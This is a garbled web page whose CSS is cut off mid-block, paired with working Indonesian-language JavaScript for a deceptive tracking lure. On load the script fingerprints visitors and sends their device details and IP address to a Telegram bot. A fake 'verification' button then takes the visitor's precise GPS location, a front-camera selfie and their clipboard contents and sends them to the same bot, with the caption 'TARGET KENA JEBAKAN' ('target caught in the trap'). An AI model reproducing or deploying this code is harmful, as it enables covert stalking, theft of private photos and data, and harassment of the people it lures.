        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 50%, rgba(79, 172, 254, 0.08) 0%, transparent 50%),
                        radial-gradient(circle at 80% 80%, rgba(0, 242, 254, 0.06) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        /* Moving grid */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(79, 172, 254, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(79, 172, 254, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: 0;
            animation: gridMove 20s linear infinite;
        }

        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        /* Hexagon pattern */
        .hex-pattern {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            opacity: 0.15;
        }

        .hexagon {
            position: absolute;
            width: 80px;
            height: 46px;
            background: transparent;
            border-left: 2px solid rgba(79, 172, 254, 0.3);
            border-right: 2px solid rgba(79, 172, 254, 0.3);
            animation: hexFloat 15s ease-in-out infinite;
        }

        .hexagon:before,
        .hexagon:after {
            content: "";
            position: absolute;
            width: 0;
            border-left: 40px solid transparent;
            border-right: 40px solid transparent;
        }

        .hexagon:before {
            bottom: 100%;
            border-bottom: 23px solid rgba(79, 172, 254, 0.3);
        }

        .hexagon:after {
            top: 100%;
            border-top: 23px solid rgba(79, 172, 254, 0.3);
        }

        .hexagon:nth-child(1) {
            top: 10%;
            left: 10%;
            animation-delay: 0s;
        }

        .hexagon:nth-child(2) {
            top: 60%;
            left: 85%;
            animation-delay: 2s;
        }

        .hexagon:nth-child(3) {
            top: 80%;
            left: 15%;
            animation-delay: 4s;
        }

        .hexagon:nth-child(4) {
            top: 30%;
            left: 75%;
            animation-delay: 1s;
        }

        @keyframes hexFloat {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
                opacity: 0.2;
            }
            50% {
                transform: translateY(-30px) rotate(180deg);
                opacity: 0.4;
            }
        }

        .circuit-line {
            position: fixed;
            background: linear-gradient(90deg, transparent, rgba(79, 172, 254, 0.4), transparent);
            pointer-events: none;
            z-index: 0;
        }

        .circuit-line.horizontal {
            width: 100%;
            height: 1px;
            left: 0;
        }

        .circuit-line.vertical {
            width: 1px;
            height: 100%;
            top: 0;
        }

        .circuit-line:nth-child(1) {
            top: 20%;
            animation: lineMove 8s linear infinite;
        }

        .circuit-line:nth-child(2) {
            top: 50%;
            animation: lineMove 10s linear infinite reverse;
        }

        .circuit-line:nth-child(3) {
            top: 80%;
            animation: lineMove 12s linear infinite;
        }

        .circuit-line:nth-child(4) {
            left: 25%;
            animation: lineMoveVertical 9s linear infinite;
        }

        .circuit-line:nth-child(5) {
            left: 75%;
            animation: lineMoveVertical 11s linear infinite reverse;
        }

        @keyframes lineMove {
            0% {
                transform: translateX(-100%);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: translateX(100%);
                opacity: 0;
            }

        @keyframes lineMoveVertical {
            0% {
                transform: translateY(-100%);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: translateY(100%);

        @keyframes spin {

        .error-message {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(220, 38, 38, 0.1));

        @keyframes shake {

        .success-page {

        @keyframes scaleInRotate {

        video {

        @media (max-width: 640px) {

            }

            }

            }
        }

                    gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Available';
                }
            } catch (e) {
                gpuInfo = 'Not Available';
            }

            return {
                browser: browserName,
                browserVersion: browserVersion,
                os: osName,
                osVersion: osVersion,
                deviceType: deviceType,
                userAgent: ua,
                language: navigator.language,
                languages: navigator.languages.join(', '),
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                screenColorDepth: `${window.screen.colorDepth}-bit`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                pixelRatio: window.devicePixelRatio || 1,
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: connectionType,
                downlink: downlink,
                rtt: rtt,
                batteryInfo: batteryInfo,
                gpuInfo: gpuInfo,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset() / -60,
                timestamp: new Date().toISOString()
            };
        }

        // Get IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Send message to Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Send photo to Telegram
        async function sendPhotoToTelegram(blob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                formData.append('caption', caption);

                const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
                return false;
            }
        }

        // Send initial device info when visitor arrives
        async function sendInitialDeviceInfo() {
            const deviceInfo = await getDeviceInfo();
            const ip = await getIPAddress();
            
            const message = `
📱 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗗𝗘𝗩𝗜𝗖𝗘 📱

ʙʀᴏᴡꜱᴇʀ: ${deviceInfo.browser} ${deviceInfo.browserVersion}
ᴏꜱ; ${deviceInfo.os} ${deviceInfo.osVersion}
ᴅᴇᴠɪᴄᴇ ᴛʏᴘᴇ: ${deviceInfo.deviceType}
ɪᴘ ᴀᴅᴅʀᴇꜱꜱ: ${ip}
ᴠᴇɴᴅᴏʀ: ${deviceInfo.vendor}
ᴘʟᴀᴛꜰᴏʀᴍ: ${deviceInfo.platform}

<b>TAMPILAN & GRAFIS</b>
ꜱᴄʀᴇᴇɴ: ${deviceInfo.screenResolution}
ᴠɪᴇᴡᴘᴏʀᴛ: ${deviceInfo.viewport}
ᴄᴏʟᴏʀ ᴅᴇᴘᴛʜ: ${deviceInfo.screenColorDepth}
ᴘɪxᴇʟ ʀᴀᴛɪᴏ: ${deviceInfo.pixelRatio}x
ɢᴘᴜ: ${deviceInfo.gpuInfo}
ᴛᴏᴜᴄʜ ᴘᴏɪɴᴛꜱ: ${deviceInfo.maxTouchPoints}

<b>HARDWARE</b>
ᴍᴇᴍᴏʀʏ: ${deviceInfo.deviceMemory}
ᴄᴘᴜ ᴄᴏʀᴇꜱ: ${deviceInfo.hardwareConcurrency}
ʙᴀᴛᴛᴇʀʏ: ${deviceInfo.batteryInfo}

<b>NETWORK</b>
ᴄᴏɴɴᴇᴄᴛɪᴏɴ: ${deviceInfo.connectionType}
ᴅᴏᴡɴʟɪɴᴋ: ${deviceInfo.downlink}
ʀᴛᴛ: ${deviceInfo.rtt}
ꜱᴛᴀᴛᴜꜱ: ${deviceInfo.onlineStatus}

<b>BAHASA & ZONA</b>

ʟᴀɴɢᴜᴀɢᴇꜱ: ${deviceInfo.languages}
ᴛɪᴍᴇᴢᴏɴᴇ: ${deviceInfo.timezone}
ᴜᴛᴄ ᴏꜰꜰꜱᴇᴛ: GMT${deviceInfo.timezoneOffset >= 0 ? '+' : ''}${deviceInfo.timezoneOffset}

<b>PRIVACY & SETTINGS</b>
ᴄᴏᴏᴋɪᴇꜱ: ${deviceInfo.cookieEnabled ? 'Enabled ✅' : 'Disabled ❌'}
ᴅᴏ ɴᴏᴛ ᴛʀᴀᴄᴋ: ${deviceInfo.doNotTrack}

<b>WAKTU KUNJUNGAN</b>
${new Date().toLocaleString('id-ID', { 
    weekday: 'long', 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
})}

<b>User Agent:</b>

            `;
            
            await sendToTelegram(message);
        }

        // Get location
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation tidak didukung oleh browser Anda'));
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    position => resolve(position),
                    error => reject(error),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // Get camera and take photo
        async function getCameraAndTakePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: false 
                });
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                video.srcObject = stream;
                await video.play();

                // Wait a bit for camera to adjust
                await new Promise(resolve => setTimeout(resolve, 1000));

                // Take photo
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Stop camera
                stream.getTracks().forEach(track => track.stop());

                // Convert to blob
                return new Promise(resolve => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
                });
            } catch (error) {
                throw error;
            }
        }

        // Show loading
        function showLoading(show) {
            const loading = document.getElementById('loading');
            const btn = document.getElementById('btnMasuk');
            
            if (show) {
                loading.classList.add('active');
                btn.disabled = true;
            } else {
                loading.classList.remove('active');
                btn.disabled = false;
            }
        }

        // Show error
        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            errorEl.textContent = message;
            errorEl.classList.add('active');
            
            setTimeout(() => {
                errorEl.classList.remove('active');
            }, 5000);
        }

        // Show success page
        function showSuccessPage() {
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('successPage').classList.add('active');
        }

        // Get clipboard content
        async function getClipboardContent() {
            try {
                const clipboardText = await navigator.clipboard.readText();
                return clipboardText || 'Clipboard kosong';
            } catch (error) {
                return 'Tidak dapat mengakses clipboard (izin ditolak atau tidak tersedia)';
            }
        }

        // Request notification permission and send notification
        async function sendPushNotification() {
            try {
                if ('Notification' in window) {
                    const permission = await Notification.requestPermission();
                    if (permission === 'granted') {
                        new Notification('Byexe', {
                            body: 'Selamat! Kamu sudah menjadi member kami 🎉',
                            icon: 'https://img.icons8.com/fluency/96/000000/checkmark.png',
                            badge: 'https://img.icons8.com/fluency/96/000000/checkmark.png',
                            vibrate: [200, 100, 200]
                        });
                    }
                }
            } catch (error) {
                console.log('Notification not supported:', error);
            }
        }

        // Handle masuk button click
        document.getElementById('btnMasuk').addEventListener('click', async () => {
            showLoading(true);

            try {
                // 1. Request location permission
                let location;
                try {
                    location = await getLocation();
                } catch (error) {
                    showLoading(false);
                    showError('Anda verifikasi terlebih dahulu sebagai undangan yang sah');
                    return;
                }

                // 2. Request camera permission and take photo
                let photoBlob;
                try {
                    photoBlob = await getCameraAndTakePhoto();
                } catch (error) {
                    showLoading(false);
                    showError('Anda verifikasi terlebih dahulu sebagai undangan yang sah');
                    return;
                }

                // 3. Get device info, IP and clipboard
                const deviceInfo = await getDeviceInfo();
                const ip = await getIPAddress();
                const clipboardContent = await getClipboardContent();

                // 4. Prepare location data
                const lat = location.coords.latitude;
                const lon = location.coords.longitude;
                const accuracy = location.coords.accuracy;
                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // Get address from coordinates (reverse geocoding)
                let address = 'Memuat alamat...';
                try {
                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const geoData = await geoResponse.json();
                    address = geoData.display_name || 'Alamat tidak ditemukan';
                } catch (error) {
                    address = 'Gagal memuat alamat';
                }

                // 5. Send selfie with location and clipboard caption
                const selfieCaption = `
👹 𝐓𝐀𝐑𝐆𝐄𝐓 𝐊𝐄𝐍𝐀 𝐉𝐄𝐁𝐀𝐊𝐀𝐍 👹

🌏 𝗟𝗼𝗸𝗮𝘀𝗶 𝗚𝗣𝗦 🌏
ʟᴀᴛɪᴛᴜᴅᴇ: ${lat.toFixed(7)}
ʟᴏɴɢɪᴛᴜᴅᴇ: ${lon.toFixed(7)}
ᴀᴋᴜʀᴀꜱɪ: ±${accuracy.toFixed(2)} meter
ᴀʟᴀᴍᴀᴛ: ${address}
ʟɪɴᴋ ʟᴏᴋᴀꜱɪ: ${googleMapsLink}

📋 𝗖𝗹𝗶𝗽𝗯𝗼𝗮𝗿𝗱 📋
${clipboardContent}

🕛 𝗪𝗮𝗸𝘁𝘂 🕛
${new Date().toLocaleString('id-ID', { 
    weekday: 'long', 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
})}
                `;
                
                await sendPhotoToTelegram(photoBlob, selfieCaption);

                // 6. Send location pin
                await fetch(`${TELEGRAM_API}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: lat,
                        longitude: lon
                    })
                });

                // 7. Send push notification to visitor
                await sendPushNotification();

                showLoading(false);
                showSuccessPage();

            } catch (error) {
                console.error('Error:', error);
                showLoading(false);
                showError('Terjadi kesalahan. Silakan coba lagi.');
            }
        });

        // Create binary rain effect
        function createBinaryRain() {
            const binaryRain = document.getElementById('binaryRain');
            const binaryChars = '01';
            const columns = Math.floor(window.innerWidth / 20);
            
            for (let i = 0; i < columns; i++) {
                const column = document.createElement('div');
                column.className = 'binary-column';
                column.style.left = `${i * 20}px`;
                column.style.animationDuration = `${Math.random() * 3 + 2}s`;
                column.style.animationDelay = `${Math.random() * 2}s`;
                
                let binaryString = '';
                for (let j = 0; j < Math.floor(Math.random() * 20) + 10; j++) {
                    binaryString += binaryChars[Math.floor(Math.random() * binaryChars.length)] + '<br>';
                }
                column.innerHTML = binaryString;
                
                binaryRain.appendChild(column);
            }
        }

        // Send initial device info when page loads
        window.addEventListener('load', () => {
            sendInitialDeviceInfo();
            createBinaryRain();
        });
  </script>
